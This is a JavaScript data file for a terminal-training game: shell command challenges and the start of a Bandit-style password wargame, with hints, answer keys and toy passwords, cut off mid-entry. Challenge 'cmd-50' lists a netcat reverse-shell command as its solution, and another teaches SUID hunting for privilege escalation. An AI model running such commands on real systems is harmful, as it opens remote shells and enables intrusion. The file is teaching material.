// ============================================================================
// TERMINAL CHALLENGE — Challenge Data (150 Challenges)
// ============================================================================

const CHALLENGES = {

  // ==========================================================================
  // COMMAND CHALLENGE (60 Challenges)
  // ==========================================================================
  command: [
    // ---- EASY (15) ----
    {
      id: 'cmd-1', title: 'Hello World', difficulty: 'easy', xp: 10,
      description: 'Print "Hello World" to the terminal.',
      objective: 'Use the echo command to display text.',
      hints: ['The echo command prints text to stdout.', 'Wrap the text in quotes.'],
      solutions: ['echo "Hello World"', 'echo Hello World', "echo 'Hello World'"],
      successMessage: '🎉 Great start! You printed your first message!'
    },
    {
      id: 'cmd-2', title: 'List Files', difficulty: 'easy', xp: 10,
      description: 'List all files in the current directory.',
      objective: 'Use a command to see directory contents.',
      hints: ['The command is two letters long.', 'It stands for "list".'],
      solutions: ['ls'],
      successMessage: '📂 You can now see what\'s in the directory!'
    },
    {
      id: 'cmd-3', title: 'Hidden Files', difficulty: 'easy', xp: 10,
      description: 'List all files including hidden ones with detailed information.',
      objective: 'Show hidden files and file details.',
      hints: ['Add flags to the ls command.', '-a shows hidden files, -l shows details.'],
      solutions: ['ls -la', 'ls -al', 'ls -a -l', 'ls -l -a'],
      successMessage: '👁️ Now you can see hidden files too!'
    },
    {
      id: 'cmd-4', title: 'Where Am I?', difficulty: 'easy', xp: 10,
      description: 'Print the current working directory.',
      objective: 'Find out your current location in the filesystem.',
      hints: ['Three letters: print working directory.', 'pwd'],
      solutions: ['pwd'],
      successMessage: '📍 You know exactly where you are!'
    },
    {
      id: 'cmd-5', title: 'Make Directory', difficulty: 'easy', xp: 10,
      description: 'Create a directory called "test".',
      objective: 'Use the mkdir command.',
      hints: ['mkdir creates directories.', 'mkdir followed by the name.'],
      solutions: ['mkdir test'],
      successMessage: '📁 Directory created successfully!'
    },
    {
      id: 'cmd-6', title: 'Read File', difficulty: 'easy', xp: 10,
      description: 'Display the contents of a file called "readme.txt".',
      objective: 'Read file contents using a command.',
      hints: ['Think of a small animal...', 'cat displays file contents.'],
      solutions: ['cat readme.txt'],
      successMessage: '📄 You read the file contents!'
    },
    {
      id: 'cmd-7', title: 'Remove File', difficulty: 'easy', xp: 10,
      description: 'Remove a file called "trash.txt".',
      objective: 'Delete a file from the filesystem.',
      hints: ['rm removes files.', 'rm followed by filename.'],
      solutions: ['rm trash.txt'],
      successMessage: '🗑️ File deleted!'
    },
    {
      id: 'cmd-8', title: 'Copy File', difficulty: 'easy', xp: 10,
      description: 'Copy "file1.txt" to "file2.txt".',
      objective: 'Duplicate a file with a new name.',
      hints: ['cp copies files.', 'cp source destination'],
      solutions: ['cp file1.txt file2.txt'],
      successMessage: '📋 File copied successfully!'
    },
    {
      id: 'cmd-9', title: 'Move File', difficulty: 'easy', xp: 10,
      description: 'Move (rename) "old.txt" to "new.txt".',
      objective: 'Rename a file using the move command.',
      hints: ['mv moves or renames files.', 'mv old new'],
      solutions: ['mv old.txt new.txt'],
      successMessage: '🔄 File renamed!'
    },
    {
      id: 'cmd-10', title: 'Touch File', difficulty: 'easy', xp: 10,
      description: 'Create an empty file called "newfile.txt".',
      objective: 'Create a new empty file.',
      hints: ['touch creates empty files.', 'touch filename'],
      solutions: ['touch newfile.txt'],
      successMessage: '✨ Empty file created!'
    },
    {
      id: 'cmd-11', title: 'Head of File', difficulty: 'easy', xp: 10,
      description: 'Display the first 10 lines of "log.txt".',
      objective: 'View the beginning of a file.',
      hints: ['The opposite of tail.', 'head shows the first lines.'],
      solutions: ['head log.txt', 'head -n 10 log.txt', 'head -10 log.txt'],
      successMessage: '⬆️ You peeked at the top of the file!'
    },
    {
      id: 'cmd-12', title: 'Tail of File', difficulty: 'easy', xp: 10,
      description: 'Display the last 10 lines of "log.txt".',
      objective: 'View the end of a file.',
      hints: ['The opposite of head.', 'tail shows the last lines.'],
      solutions: ['tail log.txt', 'tail -n 10 log.txt', 'tail -10 log.txt'],
      successMessage: '⬇️ You checked the bottom of the file!'
    },
    {
      id: 'cmd-13', title: 'Date & Time', difficulty: 'easy', xp: 10,
      description: 'Show the current date and time.',
      objective: 'Display system date/time.',
      hints: ['A four-letter command.', 'date'],
      solutions: ['date'],
      successMessage: '🕐 Now you know the time!'
    },
    {
      id: 'cmd-14', title: 'Who Am I?', difficulty: 'easy', xp: 10,
      description: 'Display the current username.',
      objective: 'Find out who you are logged in as.',
      hints: ['Ask the system who you are.', 'whoami'],
      solutions: ['whoami'],
      successMessage: '🧑 Identity confirmed!'
    },
    {
      id: 'cmd-15', title: 'Clear Screen', difficulty: 'easy', xp: 10,
      description: 'Clear the terminal screen.',
      objective: 'Clean up the terminal display.',
      hints: ['A five-letter word meaning to clean.', 'clear'],
      solutions: ['clear'],
      successMessage: '🧹 Terminal cleared!'
    },

    // ---- MEDIUM (15) ----
    {
      id: 'cmd-16', title: 'Find Files', difficulty: 'medium', xp: 25,
      description: 'Find all .txt files in the current directory recursively.',
      objective: 'Use the find command with name pattern.',
      hints: ['find searches for files.', 'Use -name with a wildcard pattern.'],
      solutions: ['find . -name "*.txt"', "find . -name '*.txt'", 'find . -name *.txt'],
      successMessage: '🔍 You found all the text files!'
    },
    {
      id: 'cmd-17', title: 'Count Lines', difficulty: 'medium', xp: 25,
      description: 'Count the number of lines in "data.log".',
      objective: 'Use word count to count lines.',
      hints: ['wc counts things in files.', '-l flag counts lines.'],
      solutions: ['wc -l data.log'],
      successMessage: '🔢 Lines counted!'
    },
    {
      id: 'cmd-18', title: 'Search Text', difficulty: 'medium', xp: 25,
      description: 'Search for the word "error" in "server.log".',
      objective: 'Find text patterns in a file.',
      hints: ['grep searches for patterns.', 'grep pattern filename'],
      solutions: ['grep "error" server.log', "grep 'error' server.log", 'grep error server.log'],
      successMessage: '🎯 Pattern found!'
    },
    {
      id: 'cmd-19', title: 'Disk Usage', difficulty: 'medium', xp: 25,
      description: 'Display disk usage in human-readable format.',
      objective: 'Check disk space on the system.',
      hints: ['df shows disk free space.', '-h makes it human-readable.'],
      solutions: ['df -h'],
      successMessage: '💾 Disk usage displayed!'
    },
    {
      id: 'cmd-20', title: 'Last 20 Lines', difficulty: 'medium', xp: 25,
      description: 'Show the last 20 lines of "access.log".',
      objective: 'Use tail with a line count.',
      hints: ['tail with -n flag specifies lines.', 'tail -n 20 or tail -20'],
      solutions: ['tail -n 20 access.log', 'tail -20 access.log'],
      successMessage: '📜 Got the last 20 lines!'
    },
    {
      id: 'cmd-21', title: 'Sort File', difficulty: 'medium', xp: 25,
      description: 'Sort the contents of "names.txt" alphabetically.',
      objective: 'Order file contents.',
      hints: ['sort is the command you need.', 'sort filename'],
      solutions: ['sort names.txt'],
      successMessage: '🔤 File sorted alphabetically!'
    },
    {
      id: 'cmd-22', title: 'Unique Lines', difficulty: 'medium', xp: 25,
      description: 'Display only unique lines from "data.txt" (remove duplicates).',
      objective: 'Filter out duplicate lines.',
      hints: ['uniq removes adjacent duplicates.', 'Often used with sort.'],
      solutions: ['uniq data.txt', 'sort data.txt | uniq', 'sort -u data.txt'],
      successMessage: '✨ Duplicates removed!'
    },
    {
      id: 'cmd-23', title: 'File Type', difficulty: 'medium', xp: 25,
      description: 'Show the file type of "mystery_file".',
      objective: 'Identify what kind of file something is.',
      hints: ['The command is the same as the concept.', 'file command identifies file types.'],
      solutions: ['file mystery_file'],
      successMessage: '🔎 File type identified!'
    },
    {
      id: 'cmd-24', title: 'Make Executable', difficulty: 'medium', xp: 25,
      description: 'Change permissions of "script.sh" to make it executable.',
      objective: 'Modify file permissions.',
      hints: ['chmod changes permissions.', '+x adds execute permission.'],
      solutions: ['chmod +x script.sh', 'chmod 755 script.sh', 'chmod a+x script.sh'],
      successMessage: '⚡ Script is now executable!'
    },
    {
      id: 'cmd-25', title: 'Symbolic Link', difficulty: 'medium', xp: 25,
      description: 'Create a symbolic link called "link" pointing to "source".',
      objective: 'Create a symlink.',
      hints: ['ln creates links.', '-s makes it symbolic.'],
      solutions: ['ln -s source link'],
      successMessage: '🔗 Symbolic link created!'
    },
    {
      id: 'cmd-26', title: 'Directory Sizes', difficulty: 'medium', xp: 25,
      description: 'Display the size of each file in the current directory in human-readable format.',
      objective: 'Check sizes of files.',
      hints: ['du shows disk usage.', '-sh for summary and human-readable.'],
      solutions: ['du -sh *', 'du -sh ./*'],
      successMessage: '📊 Sizes displayed!'
    },
    {
      id: 'cmd-27', title: 'Download File', difficulty: 'medium', xp: 25,
      description: 'Download a file from "http://example.com/file.txt".',
      objective: 'Fetch a file from the internet.',
      hints: ['wget downloads files.', 'curl can also be used with -O.'],
      solutions: ['wget http://example.com/file.txt', 'curl -O http://example.com/file.txt'],
      successMessage: '⬇️ File downloaded!'
    },
    {
      id: 'cmd-28', title: 'Environment Variables', difficulty: 'medium', xp: 25,
      description: 'Show all environment variables.',
      objective: 'View system environment.',
      hints: ['env shows all variables.', 'printenv also works.'],
      solutions: ['env', 'printenv'],
      successMessage: '🌍 Environment variables listed!'
    },
    {
      id: 'cmd-29', title: 'Manual Pages', difficulty: 'medium', xp: 25,
      description: 'Display the manual page for the "ls" command.',
      objective: 'Read documentation for a command.',
      hints: ['man shows manual pages.', 'man command_name'],
      solutions: ['man ls'],
      successMessage: '📖 Manual page opened!'
    },
    {
      id: 'cmd-30', title: 'Concatenate Files', difficulty: 'medium', xp: 25,
      description: 'Concatenate "file1.txt" and "file2.txt" into "combined.txt".',
      objective: 'Merge files together.',
      hints: ['cat can join files.', 'Use > to redirect output.'],
      solutions: ['cat file1.txt file2.txt > combined.txt'],
      successMessage: '📎 Files merged!'
    },

    // ---- HARD (15) ----
    {
      id: 'cmd-31', title: 'Recently Modified', difficulty: 'hard', xp: 50,
      description: 'Find all files modified in the last 24 hours.',
      objective: 'Search by modification time.',
      hints: ['find has a -mtime flag.', '-1 means less than 1 day ago.'],
      solutions: ['find . -mtime -1', 'find . -mtime 0'],
      successMessage: '⏰ Found recent files!'
    },
    {
      id: 'cmd-32', title: 'Find & Replace', difficulty: 'hard', xp: 50,
      description: 'Replace all occurrences of "foo" with "bar" in file.txt.',
      objective: 'Use sed for text substitution.',
      hints: ['sed is a stream editor.', "s/old/new/g replaces globally."],
      solutions: ["sed -i 's/foo/bar/g' file.txt", 'sed -i "s/foo/bar/g" file.txt'],
      successMessage: '✏️ Text replaced!'
    },
    {
      id: 'cmd-33', title: 'Sort Unique', difficulty: 'hard', xp: 50,
      description: 'Display sorted unique lines from "data.txt".',
      objective: 'Combine sorting and deduplication.',
      hints: ['sort has a unique flag.', '-u removes duplicates after sorting.'],
      solutions: ['sort -u data.txt', 'sort data.txt | uniq'],
      successMessage: '🎯 Sorted and unique!'
    },
    {
      id: 'cmd-34', title: 'Create Archive', difficulty: 'hard', xp: 50,
      description: 'Archive the /var/log directory with gzip compression into logs.tar.gz.',
      objective: 'Create a compressed archive.',
      hints: ['tar creates archives.', '-czf = create, gzip, filename.'],
      solutions: ['tar -czf logs.tar.gz /var/log', 'tar czf logs.tar.gz /var/log'],
      successMessage: '📦 Archive created!'
    },
    {
      id: 'cmd-35', title: 'Memory Hog', difficulty: 'hard', xp: 50,
      description: 'Show all running processes sorted by memory usage (highest first).',
      objective: 'Monitor process memory consumption.',
      hints: ['ps shows processes.', 'Use --sort flag with -%mem.'],
      solutions: ['ps aux --sort=-%mem', 'ps aux --sort -%mem'],
      successMessage: '🧠 Memory hogs identified!'
    },
    {
      id: 'cmd-36', title: 'Big Files', difficulty: 'hard', xp: 50,
      description: 'Find all files larger than 100MB on the system.',
      objective: 'Search by file size.',
      hints: ['find with -size flag.', '+100M means larger than 100 megabytes.'],
      solutions: ['find / -size +100M', 'find / -size +100M -type f'],
      successMessage: '🐘 Found the big files!'
    },
    {
      id: 'cmd-37', title: 'Recursive Grep', difficulty: 'hard', xp: 50,
      description: 'Search recursively for the word "password" in all files under the current directory.',
      objective: 'Search across multiple files.',
      hints: ['grep with -r flag searches recursively.', 'grep -r pattern directory'],
      solutions: ['grep -r "password" .', "grep -r 'password' .", 'grep -r password .', 'grep -rn "password" .'],
      successMessage: '🔓 Found occurrences!'
    },
    {
      id: 'cmd-38', title: 'Diff Files', difficulty: 'hard', xp: 50,
      description: 'Show the differences between "file1.txt" and "file2.txt".',
      objective: 'Compare two files.',
      hints: ['diff compares files.', 'diff file1 file2'],
      solutions: ['diff file1.txt file2.txt'],
      successMessage: '📝 Differences found!'
    },
    {
      id: 'cmd-39', title: 'Word Count', difficulty: 'hard', xp: 50,
      description: 'Display the number of words in "essay.txt".',
      objective: 'Count words in a file.',
      hints: ['wc counts words too.', '-w flag counts words.'],
      solutions: ['wc -w essay.txt'],
      successMessage: '📊 Words counted!'
    },
    {
      id: 'cmd-40', title: 'Kill Process', difficulty: 'hard', xp: 50,
      description: 'Kill the process with PID 1234.',
      objective: 'Terminate a running process.',
      hints: ['kill sends signals to processes.', 'kill PID'],
      solutions: ['kill 1234', 'kill -9 1234', 'kill -SIGKILL 1234'],
      successMessage: '💀 Process terminated!'
    },
    {
      id: 'cmd-41', title: 'Schedule Task', difficulty: 'hard', xp: 50,
      description: 'Schedule the command "backup.sh" to run at midnight using at.',
      objective: 'Schedule a one-time task.',
      hints: ['at schedules commands.', 'Echo the command and pipe to at.'],
      solutions: ['echo "backup.sh" | at midnight', "echo 'backup.sh' | at midnight"],
      successMessage: '⏰ Task scheduled!'
    },
    {
      id: 'cmd-42', title: 'List Packages', difficulty: 'hard', xp: 50,
      description: 'List all installed packages on a Debian-based system.',
      objective: 'Query the package manager.',
      hints: ['dpkg manages Debian packages.', '-l lists installed packages.'],
      solutions: ['dpkg -l', 'dpkg --list', 'apt list --installed'],
      successMessage: '📦 Packages listed!'
    },
    {
      id: 'cmd-43', title: 'Open Ports', difficulty: 'hard', xp: 50,
      description: 'Show all open TCP/UDP ports that are listening on the system.',
      objective: 'Check network listeners.',
      hints: ['ss or netstat show network stats.', '-tuln shows TCP/UDP listening numeric.'],
      solutions: ['ss -tuln', 'netstat -tuln'],
      successMessage: '🔌 Listening ports found!'
    },
    {
      id: 'cmd-44', title: 'Compress File', difficulty: 'hard', xp: 50,
      description: 'Compress "file.txt" using gzip.',
      objective: 'Reduce file size.',
      hints: ['gzip compresses files.', 'gzip filename'],
      solutions: ['gzip file.txt'],
      successMessage: '🗜️ File compressed!'
    },
    {
      id: 'cmd-45', title: 'Find Duplicates', difficulty: 'hard', xp: 50,
      description: 'Find duplicate files by their MD5 checksum in the current directory.',
      objective: 'Identify duplicate files using checksums.',
      hints: ['md5sum creates checksums.', 'Use find, md5sum, sort, and uniq together.'],
      solutions: ['find . -type f -exec md5sum {} + | sort | uniq -d -w 32', 'find . -type f -exec md5sum {} \\; | sort | uniq -d -w 32'],
      successMessage: '♊ Duplicates detected!'
    },

    // ---- EXPERT (15) ----
    {
      id: 'cmd-46', title: 'Extract CSV Column', difficulty: 'expert', xp: 100,
      description: 'Extract column 2 from a CSV file using comma as delimiter.',
      objective: 'Parse structured data with cut.',
      hints: ['cut extracts sections from lines.', "-d sets delimiter, -f selects field."],
      solutions: ["cut -d',' -f2 file.csv", 'cut -d"," -f2 file.csv', "cut -d , -f2 file.csv"],
      successMessage: '📊 Column extracted!'
    },
    {
      id: 'cmd-47', title: 'Live Monitor', difficulty: 'expert', xp: 100,
      description: 'Monitor the file /var/log/syslog in real-time for new entries.',
      objective: 'Follow file changes live.',
      hints: ['tail has a follow mode.', '-f flag follows the file.'],
      solutions: ['tail -f /var/log/syslog'],
      successMessage: '📡 Live monitoring active!'
    },
    {
      id: 'cmd-48', title: 'Purge Empty', difficulty: 'expert', xp: 100,
      description: 'Find and delete all empty files recursively in the current directory.',
      objective: 'Combine find conditions with actions.',
      hints: ['find can delete files directly.', '-empty finds empty files, -delete removes them.'],
      solutions: ['find . -type f -empty -delete'],
      successMessage: '🧹 Empty files purged!'
    },
    {
      id: 'cmd-49', title: 'Network Connections', difficulty: 'expert', xp: 100,
      description: 'List all open network connections with process information.',
      objective: 'View active network connections.',
      hints: ['netstat or ss shows connections.', '-tuln for TCP/UDP listening numeric.'],
      solutions: ['netstat -tuln', 'netstat -tulnp', 'ss -tuln', 'ss -tulnp'],
      successMessage: '🌐 Network mapped!'
    },
    {
      id: 'cmd-50', title: 'Reverse Shell', difficulty: 'expert', xp: 100,
      description: 'Create a reverse shell connection using netcat to IP 10.10.10.1 on port 4444.',
      objective: 'Establish a reverse shell (for CTF use only!).',
      hints: ['nc (netcat) can create connections.', '-e executes a program on connect.'],
      solutions: ['nc -e /bin/sh 10.10.10.1 4444', 'nc -e /bin/bash 10.10.10.1 4444'],
      successMessage: '🐚 Reverse shell established!'
    },
    {
      id: 'cmd-51', title: 'Search Compressed', difficulty: 'expert', xp: 100,
      description: 'Search for the word "critical" inside a gzipped file "archive.gz" without decompressing it.',
      objective: 'Search within compressed files.',
      hints: ['zgrep searches compressed files.', 'Same syntax as grep.'],
      solutions: ['zgrep "critical" archive.gz', "zgrep 'critical' archive.gz", 'zgrep critical archive.gz'],
      successMessage: '🔍 Found in compressed file!'
    },
    {
      id: 'cmd-52', title: 'Find & Execute', difficulty: 'expert', xp: 100,
      description: 'Find all .log files and delete them using find with -exec.',
      objective: 'Execute commands on found files.',
      hints: ['find -exec runs a command on results.', '{} is replaced by the filename.'],
      solutions: ['find . -name "*.log" -exec rm {} \\;', "find . -name '*.log' -exec rm {} \\;", 'find . -name "*.log" -delete'],
      successMessage: '🗑️ Log files cleaned up!'
    },
    {
      id: 'cmd-53', title: 'SSH Tunnel', difficulty: 'expert', xp: 100,
      description: 'Create an SSH tunnel forwarding local port 8080 to remote port 80 on host "server".',
      objective: 'Set up port forwarding via SSH.',
      hints: ['ssh -L creates local port forwards.', 'Format: -L local:remote_host:remote_port'],
      solutions: ['ssh -L 8080:localhost:80 user@server', 'ssh -L 8080:localhost:80 server'],
      successMessage: '🚇 SSH tunnel established!'
    },
    {
      id: 'cmd-54', title: 'Awk Sum', difficulty: 'expert', xp: 100,
      description: 'Use awk to sum all numbers in column 3 of "data.txt".',
      objective: 'Process tabular data with awk.',
      hints: ['awk processes text by fields.', '$3 refers to the third column.'],
      solutions: ["awk '{sum+=$3} END {print sum}' data.txt"],
      successMessage: '🧮 Sum calculated!'
    },
    {
      id: 'cmd-55', title: 'System Monitor', difficulty: 'expert', xp: 100,
      description: 'Monitor system resources (CPU, memory) in real-time.',
      objective: 'Use an interactive system monitor.',
      hints: ['A three-letter command.', 'top or htop'],
      solutions: ['top', 'htop'],
      successMessage: '📈 System monitor launched!'
    },
    {
      id: 'cmd-56', title: 'Cron Jobs', difficulty: 'expert', xp: 100,
      description: 'List all cron jobs for the current user.',
      objective: 'View scheduled recurring tasks.',
      hints: ['crontab manages cron jobs.', '-l lists them.'],
      solutions: ['crontab -l'],
      successMessage: '📅 Cron jobs listed!'
    },
    {
      id: 'cmd-57', title: 'SUID Files', difficulty: 'expert', xp: 100,
      description: 'Find all files with SUID permission set on the system.',
      objective: 'Identify privilege escalation vectors.',
      hints: ['find with -perm flag.', '-4000 checks for SUID bit.'],
      solutions: ['find / -perm -4000 2>/dev/null', 'find / -perm -u=s 2>/dev/null', 'find / -perm -4000'],
      successMessage: '⚠️ SUID files identified!'
    },
    {
      id: 'cmd-58', title: 'Hash File', difficulty: 'expert', xp: 100,
      description: 'Generate the MD5 hash of "file.txt".',
      objective: 'Create a file checksum.',
      hints: ['md5sum creates MD5 hashes.', 'md5sum filename'],
      solutions: ['md5sum file.txt'],
      successMessage: '#️⃣ Hash generated!'
    },
    {
      id: 'cmd-59', title: 'Recursive Chown', difficulty: 'expert', xp: 100,
      description: 'Change ownership of /opt/app and all contents to user "deploy" and group "www".',
      objective: 'Recursively change file ownership.',
      hints: ['chown changes ownership.', '-R makes it recursive.'],
      solutions: ['chown -R deploy:www /opt/app'],
      successMessage: '👤 Ownership changed!'
    },
    {
      id: 'cmd-60', title: 'Xargs Pipeline', difficulty: 'expert', xp: 100,
      description: 'Use grep to find files containing "TODO" and delete them with xargs.',
      objective: 'Build powerful command pipelines.',
      hints: ['grep -rl finds files containing text.', 'Pipe to xargs rm.'],
      solutions: ['grep -rl "TODO" . | xargs rm', "grep -rl 'TODO' . | xargs rm"],
      successMessage: '🔗 Pipeline mastered!'
    }
  ],

  // ==========================================================================
  // BANDIT CHALLENGE (50 Challenges)
  // ==========================================================================
  bandit: [
    // ---- EASY (12) ----
    {
      id: 'ban-1', title: 'Level 0: The Readme', difficulty: 'easy', xp: 15,
      description: 'The password for the next level is stored in a file called "readme" in the home directory.',
      objective: 'Read a simple file to find the password.',
      hints: ['Use cat to read files.', 'The file is right here in the home directory.'],
      password: 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL',
      solutions: ['cat readme'],
      filesystem: {
        'readme': 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL',
        '.bashrc': '# ~/.bashrc\nexport PATH=/usr/local/bin:$PATH'
      },
      successMessage: '🔑 Password found! Welcome to the Bandit.'
    },
    {
      id: 'ban-2', title: 'Level 1: Hidden Secret', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a hidden file called ".secret" in the home directory.',
      objective: 'Find and read hidden files.',
      hints: ['Hidden files start with a dot.', 'Use ls -a to see them, then cat to read.'],
      password: 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi',
      solutions: ['cat .secret'],
      filesystem: {
        '.secret': 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi',
        'readme': 'Nothing to see here...',
        '.bashrc': '# ~/.bashrc'
      },
      successMessage: '👁️ Hidden file revealed!'
    },
    {
      id: 'ban-3', title: 'Level 2: Spaces in Name', difficulty: 'easy', xp: 15,
      description: 'The password is in a file called "spaces in this filename" in the home directory.',
      objective: 'Handle filenames with spaces.',
      hints: ['Wrap the filename in quotes.', 'cat "filename with spaces"'],
      password: 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG',
      solutions: ['cat "spaces in this filename"', "cat 'spaces in this filename'", 'cat spaces\\ in\\ this\\ filename'],
      filesystem: {
        'spaces in this filename': 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG',
        'readme': 'Look for a file with spaces in the name'
      },
      successMessage: '📂 Spaces don\'t scare you!'
    },
    {
      id: 'ban-4', title: 'Level 3: Dashed Filename', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a file called "-" (a single dash) in the home directory.',
      objective: 'Read a file with a tricky name.',
      hints: ['A dash is treated as stdin.', 'Use ./ prefix to treat it as a file.'],
      password: '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe',
      solutions: ['cat ./-', 'cat < -'],
      filesystem: {
        '-': '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe',
        'readme': 'The password is in a file named "-"'
      },
      successMessage: '➖ Tricky filename conquered!'
    },
    {
      id: 'ban-5', title: 'Level 4: Directory Dive', difficulty: 'easy', xp: 15,
      description: 'The password is stored in a file inside the "inhere" directory.',
      objective: 'Navigate directories.',
      hints: ['Use ls to see contents of inhere/.', 'Then cat the file inside.'],
      password: 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR',
      solutions: ['cat inhere/password', 'cat inhere/.hidden'],
      filesystem: {
        'inhere/': {
          '.hidden': 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR',
          'note.txt': 'Keep looking...'
        }
      },
      successMessage: '📁 Directory explored!'
    },
    {
      id: 'ban-6', title: 'Level 5: Human Readable', difficulty: 'easy', xp: 15,
      description: 'The password is in the only human-readable file in the "inhere" directory. Other files are binary.',
      objective: 'Identify human-readable files.',
      hints: ['Use the file command to check file types.', 'file inhere/* shows each file\'s type.'],
      password: 'P4L4vucdmLnkuiJt1Wr1rjN9154lAGE0',
      solutions: ['cat inhere/-file07', 'file inhere/*'],
      filesystem: {
        'inhere/': {
          '-file00': '\x00\x01\x02BINARY',
          '-file01': '\x00\x89PNG\x00',
          '-file02': '\x7fELF\x00',
          '-file03': '\x00\x01BINARY',
          '-file04': '\xff\xd8\xff\xe0',
          '-file05': '\x00\x00BINARY',
          '-file06': '\x1f\x8b\x08',
          '-file07': 'P4L4vucdmLnkuiJt1Wr1rjN9154lAGE0',
          '-file08': '\x00BINARY\x00',
          '-file09': '\x00\x01\x03BIN'
        }
      },
      successMessage: '🔍 Human-readable file found!'
    },
    {
      id: 'ban-7', title: 'Level 6: Bashrc Secret', difficulty: 'easy', xp: 15,
      description: 'The password is stored as a variable in the ".bashrc" file.',
      objective: 'Search through configuration files.',
      hints: ['cat .bashrc to see its contents.', 'grep for "password" or "secret".'],
      password: 'z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S',
      solutions: ['cat .bashrc', 'grep password .bashrc', 'grep secret .bashrc', 'grep PASSWORD .bashrc'],
      filesystem: {
        '.bashrc': '# ~/.bashrc\nexport PATH=/usr/bin:$PATH\n# Configuration\nalias ll="ls -la"\n\n# SECRET_PASSWORD=z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S\n\nexport EDITOR=vim',
        'readme': 'Check the config files...'
      },
      successMessage: '⚙️ Config file secret found!'
    },
    {
      id: 'ban-8', title: 'Level 7: Empty Filename', difficulty: 'easy', xp: 15,
      description: 'The password IS the filename of the only empty file in the current directory.',
      objective: 'Find files by their properties.',
      hints: ['find can search for empty files.', 'find . -empty -type f'],
      password: 'TESKZC0XvTetK0S9xNwm25STk5iWrBvP',
      solutions: ['find . -empty -type f', 'find . -empty', 'ls -la'],
      filesystem: {
        'data.txt': 'Some data here\nMore data\nEven more',
        'notes.txt': 'Nothing important',
        'TESKZC0XvTetK0S9xNwm25STk5iWrBvP': '',
        'readme': 'The password is the name of the empty file'
      },
      successMessage: '📄 Clever! The filename was the password!'
    },
    {
      id: 'ban-9', title: 'Level 8: Last Line', difficulty: 'easy', xp: 15,
      description: 'The password is written in the last line of a very large file called "bigfile.txt".',
      objective: 'Extract the last line of a file.',
      hints: ['tail shows the end of files.', 'tail -1 shows just the last line.'],
      password: 'EN632PlfYiZbn3PhVK3XOGSlNInNE00t',
      solutions: ['tail -1 bigfile.txt', 'tail -n 1 bigfile.txt', 'tail bigfile.txt'],
      filesystem: {
        'bigfile.txt': 'Line 1: Nothing here\nLine 2: Keep going\nLine 3: Not this one\nLine 4: Still looking?\nLine 5: Almost there\nLine 6: Nope\nLine 7: Getting warmer\nLine 8: So close\nLine 9: One more\nLine 10: EN632PlfYiZbn3PhVK3XOGSlNInNE00t'
      },
      successMessage: '⬇️ Found it at the bottom!'
    },
    {
      id: 'ban-10', title: 'Level 9: Between Markers', difficulty: 'easy', xp: 15,
      description: 'The password is between the markers "===START===" and "===END===" in "data.txt".',
      objective: 'Extract text between markers.',
      hints: ['grep can find lines around a pattern.', 'Look for START marker.'],
      password: 'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s',
      solutions: ['grep -A1 "START" data.txt', 'cat data.txt', 'grep -A 1 START data.txt'],
      filesystem: {
        'data.txt': 'Random noise asjkdhaksjhd\nMore noise lkjsdflkj\nNot important data\n===START===\nG7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s\n===END===\nMore random noise\nEnd of file'
      },
      successMessage: '🏷️ Markers identified!'
    },
    {
      id: 'ban-11', title: 'Level 10: File Owner', difficulty: 'easy', xp: 15,
      description: 'The password is the username who owns the file "special_file". Use ls -la to check.',
      objective: 'Read file metadata.',
      hints: ['ls -la shows file ownership.', 'The owner column is the password.'],
      password: 'crypt0mast3r',
      solutions: ['ls -la special_file', 'ls -l special_file', 'ls -la'],
      filesystem: {
        'special_file': '[FILE] -rw-r--r-- crypt0mast3r users 42 Jun 15 data'
      },
      successMessage: '👤 File ownership revealed the secret!'
    },
    {
      id: 'ban-12', title: 'Level 11: Deep Nesting', difficulty: 'easy', xp: 15,
      description: 'The password is in a file inside a deeply nested directory: a/b/c/d/e/password.txt',
      objective: 'Navigate through nested directories.',
      hints: ['You can cat the full path directly.', 'cat a/b/c/d/e/password.txt'],
      password: 'FN2187isATR00p3r',
      solutions: ['cat a/b/c/d/e/password.txt'],
      filesystem: {
        'a/': {
          'b/': {
            'c/': {
              'd/': {
                'e/': {
                  'password.txt': 'FN2187isATR00p3r'
                }
              }
            }
          }
        }
      },
      successMessage: '🪆 Deep dive successful!'
    },

    // ---- MEDIUM (13) ----
    {
      id: 'ban-13', title: 'Level 12: File Hunt', difficulty: 'medium', xp: 30,
      description: 'The password is in a file somewhere under the "inhere/" directory tree. There are many files — only one has the password.',
      objective: 'Search through a directory tree.',
      hints: ['Use find to locate readable files.', 'find inhere/ -type f | xargs cat'],
      password: 'FHqXuXJHENh8PsPAvXNkZSGQrgfSTTjm',
      solutions: ['find inhere/ -type f', 'find inhere/ -readable -type f', 'cat inhere/maybehere07/.file2'],
      filesystem: {
        'inhere/': {
          'maybehere00/': { '.file1': 'NOPE', 'file2': 'NOT HERE', '-file3': '\x00BIN' },
          'maybehere01/': { '.file1': 'WRONG', 'file2': 'TRY AGAIN', '-file3': '\x00BIN' },
          'maybehere02/': { '.file1': 'NADA', 'file2': 'KEEP LOOKING', '-file3': '\x00BIN' },
          'maybehere03/': { '.file1': 'NO', 'file2': 'NOT THIS', '-file3': '\x00BIN' },
          'maybehere04/': { '.file1': 'MISS', 'file2': 'COLD', '-file3': '\x00BIN' },
          'maybehere05/': { '.file1': 'ICE COLD', 'file2': 'WARMER', '-file3': '\x00BIN' },
          'maybehere06/': { '.file1': 'HOT', 'file2': 'ALMOST!', '-file3': '\x00BIN' },
          'maybehere07/': { '.file1': 'SO CLOSE', '.file2': 'FHqXuXJHENh8PsPAvXNkZSGQrgfSTTjm', '-file3': '\x00BIN' }
        }
      },
      successMessage: '🏆 Needle in a haystack found!'
    },
    {
      id: 'ban-14', title: 'Level 13: Exact Size', difficulty: 'medium', xp: 30,
